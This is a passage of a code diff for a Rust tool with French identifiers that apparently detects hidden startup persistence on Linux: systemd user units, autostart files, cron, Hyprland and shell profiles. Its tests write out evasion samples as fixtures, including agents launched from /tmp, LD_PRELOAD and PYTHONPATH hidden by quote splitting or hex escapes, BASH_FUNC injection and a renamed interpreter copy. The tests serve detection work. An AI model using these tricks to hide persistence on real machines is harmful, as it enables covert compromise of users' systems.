     demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
-    let hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
+    let mut hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
+    // XDG_CONFIG_HOME et XDG_DATA_HOME déplacés : systemd et Hyprland y lisent aussi (vérification de la campagne E,
+    // N7 ; M-d ne couvrait que le suivi d'une unité déjà acceptée).
+    if let Some(c) = &r.config {
+        for d in ["systemd/user", "systemd/user.control"] {
+            demarrage.extend(fichiers_de(&r.sous(&c.join(d)), &UNITES));
+        }
+        demarrage.extend(fichiers_de(&r.sous(&c.join("autostart")), &["desktop"]));
+        hypr.extend(fichiers_de(&r.sous(&c.join("hypr")), &["conf", "lua"]));
+    }
+    if let Some(d) = &r.donnees {
+        demarrage.extend(fichiers_de(&r.sous(&d.join("systemd/user")), &UNITES));
+    }
     demarrage.extend(hypr.iter().cloned());
     (demarrage, hypr)
 }
@@ -1323,7 +1605,7 @@ fn juger_configuration(
                     .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 t.retraits.push(retrait(f, &lu.texte, l));
                 let d = designes::prechargement(l);
-                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, Sorte::Shell);
+                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, false, Sorte::Shell);
                 t.temoins.push(temoin);
                 t.suspects.push(trf!(
                     "{}:{} précharge une bibliothèque (LD_PRELOAD)",
@@ -1339,7 +1621,7 @@ fn juger_configuration(
                     .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 t.retraits.push(retrait(f, &lu.texte, l));
                 let d = designes::commande(l, designes::Contexte::Shell);
-                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, Sorte::Shell);
+                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, true, Sorte::Shell);
                 t.temoins.push(temoin);
                 t.suspects.push(trf!(
                     "{}:{} : {raison}",
@@ -1373,7 +1655,7 @@ fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancement
                 } else {
                     designes::commande(&commande, sorte.contexte(&maison))
                 };
-                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, sorte);
+                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, true, sorte);
                 t.temoins.push(temoin);
                 t.suspects.push(trf!(
                     "{}:{} : {raison}",
@@ -1414,7 +1696,7 @@ fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
             t.retraits.push(None);
             let numero = n.saturating_add(1);
             let d = designes::commande(&commande_de_cron(l, false), designes::Contexte::Shell);
-            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, l)).map(|c| {
+            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, l, true)).map(|c| {
                 temoins::temoin(
                     &format!("crontab:{numero}"),
                     format!("crontab:{numero}"),
@@ -1446,7 +1728,7 @@ fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
                 t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
                 t.retraits.push(retrait(&f, &lu.texte, l));
                 let d = designes::commande(&commande_de_cron(l, true), designes::Contexte::Shell);
-                let temoin = temoin_de_ligne(t, &f, n, &lu, l, d, Sorte::Shell);
+                let temoin = temoin_de_ligne(t, &f, n, &lu, l, d, true, Sorte::Shell);
                 t.temoins.push(temoin);
                 t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
             }
@@ -1583,7 +1865,7 @@ fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temo
             continue;
         };
         let d = designes::commande(&commande, designes::Contexte::Unite(None));
-        cibles_liees.extend(cibles(r, d, l)?);
+        cibles_liees.extend(cibles(r, d, l, true)?);
     }
     cibles_liees.extend(unite(r, f, texte, false)?);
     cibles_liees.push(environnement_lie(r)?);
@@ -2491,7 +2773,7 @@ mod tests {
     #[test]
     fn tout_changement_fait_revenir_l_alerte() {
         type Changement = fn(&Maison);
-        let cas: [(&str, Changement); 20] = [
+        let cas: [(&str, Changement); 26] = [
             ("unité changée", |m| {
                 m.ecrire(
                     ".config/systemd/user/rappel.service",
@@ -2590,6 +2872,25 @@ mod tests {
             ("execr-once d'Hyprland", |m| {
                 m.ecrire(".config/hypr/autostart.conf", "execr-once = /tmp/.x/agent\n");
             }),
+            // Vérification de la campagne E, N6 : un alias d'alias, nommé par des liens relatifs, et son ajout.
+            ("ajout posé sous un alias d'alias", |m| {
+                let d = m.racine.join("run/user/1000/systemd/user");
+                std::fs::create_dir_all(d.join("alias2.service.d")).unwrap();
+                std::os::unix::fs::symlink("rappel.service", d.join("alias.service")).unwrap();
+                std::os::unix::fs::symlink("alias.service", d.join("alias2.service")).unwrap();
+                std::fs::write(d.join("alias2.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
+            }),
+            // N3 : les fichiers des variables liés en entier, ceux que lisent bash, zsh et fish compris.
+            ("commentaire d'un profil", |m| m.ecrire(".bashrc", "# note\n")),
+            ("bash_login", |m| m.ecrire(".bash_login", "export GTK_MODULES=x\n")),
+            ("zlogin", |m| m.ecrire(".zlogin", "export GTK_MODULES=x\n")),
+            ("configuration de fish", |m| {
+                m.ecrire(".config/fish/conf.d/x.fish", "set -gx GTK_MODULES x\n");
+            }),
+            ("variable de Hyprland par un autre dossier", |m| {
+                m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/v.conf\n");
+                m.ecrire(".autres/v.conf", "env = GTK_MODULES,x\n");
+            }),
         ];
         for (nom, changer) in cas {
             let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
@@ -2670,15 +2971,31 @@ mod tests {
         }
     }
 
-    /// Les variables des sessions liées : un commentaire n'en pose pas (rien à montrer ni à lier), sauf continué.
+    /// Les variables des sessions liées en entier (vérification de la campagne E, N3) : tout changement d'un de
+    /// leurs fichiers, même un commentaire, fait revenir l'alerte ; plus de liste de noms à contourner.
     #[test]
-    fn variables_des_sessions_sans_commentaires() {
-        let m = maison_avec_rappel("commentaires");
-        let declare = m.lancements();
-        m.ecrire(".config/environment.d/50-x.conf", "# PYTHONPATH=/x\n  #BASH_ENV=/y\n");
-        assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()));
-        m.ecrire(".config/environment.d/50-x.conf", "# note \\\nPYTHONPATH=/x\n");
-        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
+    fn variables_des_sessions_liees_en_entier() {
+        for (i, (fichier, texte)) in [
+            (".config/environment.d/50-x.conf", "# note\n"),
+            (".config/environment.d/50-x.conf", "GTK_MODULES=/tmp/x\n"),
+            (".config/environment.d/50-x.conf", "PYTHON\\x5fPATH=/x\n"),
+            (".pam_environment", "GDK_PIXBUF_MODULE_FILE DEFAULT=/tmp/x\n"),
+            (
+                ".config/systemd/user.conf",
+                "[Manager]\nDefaultEnvironment=BASH_FUNC_x%%=()\n",
+            ),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = maison_avec_rappel(&format!("variables-{i}"));
+            let declare = m.lancements();
+            m.ecrire(fichier, texte);
+            assert!(
+                !crate::apprentissage::essai_tait(&declare, &m.lancements()),
+                "{fichier} {texte:?}"
+            );
+        }
     }
 
     /// Campagne E, M-f : un dossier personnel relatif ne passe jamais pour « rien de suspect ».
@@ -2695,6 +3012,141 @@ mod tests {
             "{}",
             c.message
         );
+        assert!(crate::apprentissage::declarable(&c).is_err());
+    }
+
+    /// Vérification de la campagne E, N3 : un fichier que lit un fichier des variables (« source = » de Hyprland,
+    /// « . » d'un profil) est lié aussi ; un « source = » calculé de Hyprland ne se suit pas, et rien ne se déclare.
+    #[test]
+    fn sources_des_variables_suivies() {
+        for (i, (fichier, texte, lu)) in [
+            (
+                ".config/hypr/hyprland.conf",
+                "source = ~/.autres/v.conf\n",
+                ".autres/v.conf",
+            ),
+            (
+                ".config/hypr/hyprland.conf",
+                "source=/home/alice/.autres/v.conf # x\n",
+                ".autres/v.conf",
+            ),
+            (".profile", ". ~/.autres/p.sh\n", ".autres/p.sh"),
+            (".bashrc", "source \"$HOME/.autres/p.sh\"\n", ".autres/p.sh"),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = maison_avec_rappel(&format!("sources-{i}"));
+            m.ecrire(fichier, texte);
+            m.ecrire(lu, "# rien\n");
+            let declare = m.lancements();
+            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
+            m.ecrire(lu, "# autre chose\n");
+            assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
+        }
+        for (i, texte) in [
+            "source = $HOME/x.conf\n",
+            "source = ~/.autres/*.conf\n",
+            "source = autres.conf\n",
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = maison_avec_rappel(&format!("sources-calculees-{i}"));
+            m.ecrire(".config/hypr/hyprland.conf", texte);
+            let c = m.lancements();
+            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte}");
+            assert!(refus(&c).contains("toutes lettres"), "{texte} : {}", refus(&c));
+        }
+        // Un profil qui se lit lui-même : la chaîne s'arrête, rien ne tourne sans fin.
+        let m = maison_avec_rappel("sources-boucle");
+        m.ecrire(".profile", ". ~/.profile\n");
+        assert!(crate::apprentissage::essai_tait(&m.lancements(), &m.lancements()));
+    }
+
+    /// Vérification de la campagne E, « -mmodule » : un interpréteur du système copié sous un autre nom lit ce que ses
+    /// options lui donnent, que rien ne lie ; la ligne ne se déclare pas. Un autre programme de même taille, si.
+    #[test]
+    fn copie_d_un_interprete_refusee() {
+        let m = Maison::nouvelle("copie");
+        let bin = m.racine.join("usr/bin");
+        std::fs::create_dir_all(&bin).unwrap();
+        std::fs::write(bin.join("python3"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
+        m.ecrire(
+            ".config/systemd/user/a.service",
+            "[Service]\nExecStart=%h/.x/outil -mrappel\n",
+        );
+        std::fs::create_dir_all(m.chemin(".x")).unwrap();
+        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
+        let c = m.lancements();
+        assert!(crate::apprentissage::declarable(&c).is_err());
+        assert!(refus(&c).contains("copie de /usr/bin/python3"), "{}", refus(&c));
+        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 autre-prog").unwrap();
+        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
+        // Un lien dur, même sans lire le contenu.
+        std::fs::remove_file(m.chemin(".x/outil")).unwrap();
+        if std::fs::hard_link(bin.join("python3"), m.chemin(".x/outil")).is_ok() {
+            assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
+        }
+    }
+
+    /// Vérification de la campagne E, N7 : une unité posée sous un XDG_CONFIG_HOME ou un XDG_DATA_HOME déplacé est
+    /// cherchée comme les autres (systemd l'y lit), et ne passe pas pour « rien de suspect ».
+    #[test]
+    fn unites_des_dossiers_deplaces_vues() {
+        for (variable, dossier) in [("XDG_CONFIG_HOME", "systemd/user"), ("XDG_DATA_HOME", "systemd/user")] {
+            let m = Maison::nouvelle(&format!("deplace-{}", variable.len() + dossier.len()));
+            let ailleurs = m.racine.join("ailleurs");
+            let vars = |v: &str| match v {
+                "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
+                x if x == variable => Some("/ailleurs".into()),
+                _ => None,
+            };
+            let lire = || {
+                persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
+                    .into_iter()
+                    .next()
+                    .unwrap()
+            };
+            assert_eq!(lire().probleme, None, "{variable}");
+            std::fs::create_dir_all(ailleurs.join(dossier)).unwrap();
+            std::fs::write(ailleurs.join(dossier).join("rappel.service"), UNITE).unwrap();
+            m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
+            assert!(lire().probleme >= Some(Niveau::Eleve), "{variable}");
+        }
+        // Le dossier de démarrage du bureau d'une configuration déplacée aussi.
+        let m = Maison::nouvelle("deplace-bureau");
+        let vars = |v: &str| (v == "XDG_CONFIG_HOME").then(|| "/ailleurs".into());
+        std::fs::create_dir_all(m.racine.join("ailleurs/autostart")).unwrap();
+        std::fs::write(
+            m.racine.join("ailleurs/autostart/maj.desktop"),
+            "[Desktop Entry]\nExec=/tmp/.x/agent\n",
+        )
+        .unwrap();
+        let c = persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
+            .into_iter()
+            .next()
+            .unwrap();
+        assert!(c.probleme >= Some(Niveau::Eleve));
+    }
+
+    /// Vérification de la campagne E, N9 : un dossier personnel que le compte ne peut pas lire n'est pas « rien de
+    /// suspect », mais « non vérifié ».
+    #[cfg(unix)]
+    #[test]
+    fn dossier_personnel_illisible_dit() {
+        use std::os::unix::fs::PermissionsExt as _;
+        let m = Maison::nouvelle("illisible-maison");
+        let maison = m.chemin("");
+        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o000)).unwrap();
+        if std::fs::read_dir(&maison).is_ok() {
+            std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
+            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root)");
+        }
+        let c = m.lancements();
+        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
+        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
+        assert!(c.message.contains("dossier personnel ne se lit pas"), "{}", c.message);
         assert!(crate::apprentissage::declarable(&c).is_err());
     }
 
@@ -2748,7 +3200,7 @@ mod tests {
     /// qui passe avant, même écrit sur des lignes continuées.
     #[test]
     fn unite_redirigee_refusee() {
-        let cas: [(&str, &str, &str); 7] = [
+        let cas: [(&str, &str, &str); 10] = [
             (
                 "rappel.service.d/x.conf",
                 "[Service]\nEnvironment=HOME=/tmp/h\n",
@@ -2771,8 +3223,25 @@ mod tests {
             ),
             (
                 "rappel.service.d/x.conf",
-                "[Service]\nWorkingDirectory=/tmp\nExecSearchPath=/tmp\n",
+                "[Service]\nExecSearchPath=/tmp\n",
                 "ExecSearchPath",
+            ),
+            // Vérification de la campagne E, N1 : le dossier de travail change ce que lit « /proc/self/cwd/… » et
+            // tout chemin relatif d'un programme.
+            (
+                "rappel.service.d/x.conf",
+                "[Service]\nWorkingDirectory=/tmp\n",
+                "WorkingDirectory",
+            ),
+            (
+                "rappel.service.d/x.conf",
+                "[Service]\nRootDirectory=/tmp\n",
+                "RootDirectory",
+            ),
+            (
+                "rappel.service.d/x.conf",
+                "[Service]\nTemporaryFileSystem=/opt\n",
+                "TemporaryFileSystem",
             ),
             ("../user.control/rappel.service", UNITE, "user.control"),
             // Campagne E : l'entrée standard d'un service peut porter le script que lit un interpréteur.
@@ -2910,9 +3379,36 @@ mod tests {
         assert!(directive_refusee("[Service]\nEnvironment=LANG=C TZ=UTC\n").is_none());
         assert!(directive_refusee("# EnvironmentFile=/x\n").is_none());
         assert_eq!(
-            directive_refusee("Environment='A=1' \\\n# note\n  \"PATH=/tmp\"\n").as_deref(),
+            directive_refusee("Environment='LANG=1' \\\n# note\n  \"PATH=/tmp\"\n").as_deref(),
             Some("Environment=PATH")
         );
+        // Vérification de la campagne E, N3 : systemd enlève les guillemets et décode « \xNN » avant de lire le
+        // nom ; seule une courte liste de noms connus passe, et une barre oblique inversée n'est jamais lue.
+        for (texte, attendu) in [
+            ("[Service]\nEnvironment=PYTHON\\x5fPATH=/tmp\n", "Environment=\\…"),
+            (
+                "[Service]\nEnvironment=\"LANG=C\" \"PYTHON\"PATH=/tmp\n",
+                "Environment=PYTHONPATH",
+            ),
+            (
+                "[Service]\nEnvironment=\"LD_PRE\"LOAD=/tmp/a.so\n",
+                "Environment=LD_PRELOAD",
+            ),
+            ("[Service]\nEnvironment=GTK_MODULES=x\n", "Environment=GTK_MODULES"),
+            ("[Service]\nEnvironment=\"LANG=C\n", "Environment"),
+            (
+                "[Service]\nPassEnvironment=BASH_FUNC_x%%\n",
+                "PassEnvironment=BASH_FUNC_x%%",
+            ),
+            ("[Service]\nWorkingDirectory=/tmp\n", "WorkingDirectory"),
+        ] {
+            let vu = directive_refusee(texte);
+            assert!(
+                vu.as_deref().is_some_and(|v| v.starts_with(attendu)),
+                "{texte:?} : {vu:?}"
+            );
+        }
+        assert!(directive_refusee("[Service]\nEnvironment=\"LANG=C\" LC_ALL=C TZ=UTC NO_COLOR=1\n").is_none());
     }
 
     /// Une ligne de cron se lit sans son horaire ni le compte qui la lance.
